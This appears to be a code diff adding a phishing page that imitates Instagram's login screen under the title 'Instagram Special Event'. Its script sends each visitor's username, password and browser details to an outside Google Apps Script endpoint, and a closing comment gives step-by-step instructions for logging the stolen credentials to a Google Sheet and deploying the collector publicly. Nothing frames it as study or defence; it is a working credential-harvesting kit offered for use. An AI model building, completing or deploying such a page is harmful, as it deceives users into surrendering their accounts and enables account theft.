@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Instagram Special Event</title>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@300;400;600;700&display=swap" rel="stylesheet" />
+<style>
+  @font-face {
+    font-family: 'Footspring';
+    src: url('Footspring.woff2') format('woff2'),
+         url('Footspring.ttf') format('truetype');
+    font-weight: normal;
+    font-style: normal;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #fafafa;
+    font-family: 'Nunito', sans-serif;
+    padding: 16px;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(0,0,0,.025) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,0,0,.025) 1px, transparent 1px);
+    background-size: 36px 36px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .wrapper {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 10px;
+    width: 100%;
+    max-width: 360px;
+    position: relative;
+    z-index: 1;
+  }
+
+  .card {
+    width: 100%;
+    background: #fff;
+    border: 1px solid #dbdbdb;
+    border-radius: 4px;
+    padding: 32px 28px 22px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  /* ── LOGO AREA ── */
+  .logo-area {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 26px;
+  }
+
+  .logo-icon {
+    width: 58px;
+    height: 58px;
+    object-fit: contain;
+    border-radius: 14px;
+  }
+
+  .logo-wordmark {
+    width: 185px;
+    height: auto;
+    display: block;
+  }
+
+  .logo-subtitle {
+    font-family: 'Footspring', 'Nunito', cursive;
+    font-size: 13px;
+    color: #8e8e8e;
+    letter-spacing: .4px;
+    text-align: center;
+    margin-top: -2px;
+  }
+
+  /* ── FORM ── */
+  form {
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    gap: 6px;
+  }
+
+  .field { position: relative; width: 100%; }
+
+  .field input {
+    width: 100%;
+    height: 44px;
+    padding: 0 48px 0 12px;
+    background: #fafafa;
+    border: 1px solid #dbdbdb;
+    border-radius: 6px;
+    font-family: 'Nunito', sans-serif;
+    font-size: 14px;
+    color: #262626;
+    outline: none;
+    transition: border-color .15s, background .15s;
+    -webkit-appearance: none;
+    appearance: none;
+  }
+  .field input:focus { border-color: #a8a8a8; background: #fff; }
+  .field input::placeholder { color: #8e8e8e; font-size: 13px; }
+
+  .pwd-toggle {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    cursor: pointer;
+    font-size: 13px;
+    font-weight: 700;
+    color: #262626;
+    padding: 4px;
+    font-family: 'Nunito', sans-serif;
+    line-height: 1;
+    user-select: none;
+    -webkit-tap-highlight-color: transparent;
+  }
+
+  /* ── BUTTON ── */
+  .btn-login {
+    width: 100%;
+    height: 44px;
+    background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+    border: none;
+    border-radius: 8px;
+    color: #fff;
+    font-family: 'Nunito', sans-serif;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    letter-spacing: .3px;
+    transition: filter .15s, transform .1s;
+    margin-top: 10px;
+    position: relative;
+    overflow: hidden;
+    -webkit-tap-highlight-color: transparent;
+    touch-action: manipulation;
+  }
+  .btn-login:hover  { filter: brightness(1.06); }
+  .btn-login:active { transform: scale(.98); }
+  .btn-login:disabled {
+    background: linear-gradient(45deg, #f09433aa, #bc1888aa);
+    cursor: default; transform: none;
+  }
+
+  .btn-login .spinner {
+    display: none;
+    width: 16px; height: 16px;
+    border: 2px solid rgba(255,255,255,.4);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin .6s linear infinite;
+    position: absolute;
+    right: 14px;
+    top: 50%; transform: translateY(-50%);
+  }
+  .btn-login.loading .spinner { display: block; }
+  @keyframes spin { to { transform: translateY(-50%) rotate(360deg); } }
+
+  .divider {
+    display: flex; align-items: center;
+    gap: 14px; width: 100%; margin: 16px 0;
+  }
+  .divider::before, .divider::after {
+    content: ''; flex: 1; height: 1px; background: #dbdbdb;
+  }
+  .divider span {
+    font-size: 13px; font-weight: 700;
+    color: #8e8e8e; letter-spacing: .06em;
+  }
+
+  .forgot {
+    text-align: center; font-size: 12px;
+    color: #00376b; text-decoration: none;
+    display: block; padding: 4px 0;
+    -webkit-tap-highlight-color: transparent;
+  }
+  .forgot:hover { text-decoration: underline; }
+
+  .signup-card {
+    width: 100%;
+    background: #fff;
+    border: 1px solid #dbdbdb;
+    border-radius: 4px;
+    padding: 16px;
+    text-align: center;
+    font-size: 14px;
+    color: #262626;
+  }
+  .signup-card a { color: #0095f6; font-weight: 700; text-decoration: none; }
+  .signup-card a:hover { text-decoration: underline; }
+
+  /* ── TOAST ── */
+  #toast {
+    position: fixed;
+    bottom: 24px; left: 50%;
+    transform: translateX(-50%) translateY(16px);
+    background: #262626; color: #fff;
+    font-size: 13px; font-family: 'Nunito', sans-serif;
+    font-weight: 600; padding: 10px 20px;
+    border-radius: 8px; opacity: 0;
+    transition: opacity .25s, transform .25s;
+    pointer-events: none;
+    white-space: nowrap; z-index: 9999;
+    max-width: calc(100vw - 32px);
+    text-align: center;
+  }
+  #toast.show    { opacity: 1; transform: translateX(-50%) translateY(0); }
+  #toast.success { background: #1a7f37; }
+  #toast.error   { background: #b91c1c; }
+
+  /* ── MOBILE ── */
+  @media (max-width: 480px) {
+    body {
+      padding: 0;
+      background: #fff;
+      align-items: flex-start;
+    }
+    body::before { display: none; }
+
+    .wrapper {
+      max-width: 100%;
+      gap: 0;
+      min-height: 100vh;
+      justify-content: center;
+      padding: 48px 24px 32px;
+    }
+
+    .card {
+      border: none;
+      border-radius: 0;
+      padding: 0 0 28px;
+      background: transparent;
+    }
+
+    .signup-card {
+      border-left: none; border-right: none;
+      border-radius: 0; background: transparent;
+      border-bottom: none;
+      padding: 18px 0 0;
+      margin-top: 10px;
+    }
+
+    .logo-wordmark { width: 200px; }
+    .logo-icon     { width: 64px; height: 64px; }
+  }
+
+  @media (max-width: 360px) {
+    .field input { font-size: 13px; }
+    .btn-login   { font-size: 14px; }
+  }
+</style>
+</head>
+<body>
+
+<div id="toast"></div>
+
+<div class="wrapper">
+  <div class="card">
+
+    <div class="logo-area">
+      <img
+        src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQbeQEaLYtW8864NUrNmf8OtltgNKJSvhx5xA&s"
+        alt="Instagram icon"
+        class="logo-icon"
+        onerror="this.style.display='none'"
+      />
+      <img
+        src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/960px-Instagram_logo.svg.png"
+        alt="Instagram"
+        class="logo-wordmark"
+        onerror="this.style.display='none'"
+      />
+      <span class="logo-subtitle">Special Events on Instagram</span>
+    </div>
+
+    <form id="loginForm" autocomplete="off" novalidate>
+      <div class="field">
+        <input
+          type="text"
+          id="username"
+          name="username"
+          placeholder="Phone number, username, or email"
+          autocomplete="username"
+          autocorrect="off"
+          autocapitalize="none"
+          spellcheck="false"
+          required
+        />
+      </div>
+
+      <div class="field">
+        <input
+          type="password"
+          id="password"
+          name="password"
+          placeholder="Password"
+          autocomplete="current-password"
+          required
+        />
+        <button type="button" class="pwd-toggle" id="pwdToggle" aria-label="Show password">Show</button>
+      </div>
+
+      <button type="submit" class="btn-login" id="loginBtn">
+        Log in
+        <span class="spinner" aria-hidden="true"></span>
+      </button>
+    </form>
+
+    <div class="divider"><span>OR</span></div>
+
+    <a href="#" class="forgot">Forgot password?</a>
+
+  </div>
+
+  <div class="signup-card">
+    Don't have an account? <a href="#">Sign up</a>
+  </div>
+</div>
+
+<script>
+const SHEET_ID   = "168-TTbl37JoltAl3swYUs9fX0xr85bA5N4SxbidteGM";
+const SCRIPT_URL = "YOUR_APPS_SCRIPT_WEB_APP_URL_HERE";
+
+const toast = document.getElementById('toast');
+
+function showToast(msg, type = '') {
+  toast.textContent = msg;
+  toast.className = 'show ' + type;
+  setTimeout(() => { toast.className = ''; }, 3200);
+}
+
+document.getElementById('pwdToggle').addEventListener('click', function () {
+  const pwd = document.getElementById('password');
+  const show = pwd.type === 'password';
+  pwd.type = show ? 'text' : 'password';
+  this.textContent = show ? 'Hide' : 'Show';
+});
+
+document.getElementById('loginForm').addEventListener('submit', async function (e) {
+  e.preventDefault();
+  const username = document.getElementById('username').value.trim();
+  const password = document.getElementById('password').value;
+
+  if (!username || !password) { showToast('Please fill in both fields.', 'error'); return; }
+
+  if (SCRIPT_URL === "YOUR_APPS_SCRIPT_WEB_APP_URL_HERE") {
+    showToast('Add your Apps Script URL first!', 'error'); return;
+  }
+
+  const btn = document.getElementById('loginBtn');
+  btn.disabled = true;
+  btn.classList.add('loading');
+  btn.childNodes[0].textContent = 'Saving… ';
+
+  try {
+    await fetch(SCRIPT_URL, {
+      method: 'POST', mode: 'no-cors',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        username, password,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent
+      })
+    });
+    showToast('✓ Credentials saved!', 'success');
+  } catch (err) {
+    showToast('Network error — try again.', 'error');
+  } finally {
+    btn.disabled = false;
+    btn.classList.remove('loading');
+    btn.childNodes[0].textContent = 'Log in ';
+  }
+});
+</script>
+
+<!--
+════════════════════════════════════════
+  CONNECT YOUR GOOGLE SHEET
+════════════════════════════════════════
+STEP 1 — Sheet → Extensions → Apps Script → paste:
+
+function doPost(e) {
+  try {
+    var data  = JSON.parse(e.postData.contents);
+    var sheet = SpreadsheetApp.openById("168-TTbl37JoltAl3swYUs9fX0xr85bA5N4SxbidteGM").getActiveSheet();
+    sheet.appendRow([data.timestamp||'', data.username||'', data.password||'', data.userAgent||'']);
+    return ContentService.createTextOutput(JSON.stringify({status:'ok'})).setMimeType(ContentService.MimeType.JSON);
+  } catch(err) {
+    return ContentService.createTextOutput(JSON.stringify({status:'error',msg:err.message})).setMimeType(ContentService.MimeType.JSON);
+  }
+}
+
+STEP 2 — Deploy → New deployment → Web App
+         Execute as: Me | Access: Anyone → copy URL
+
+STEP 3 — Replace YOUR_APPS_SCRIPT_WEB_APP_URL_HERE with that URL
+════════════════════════════════════════
+-->
+</body>
+</html>
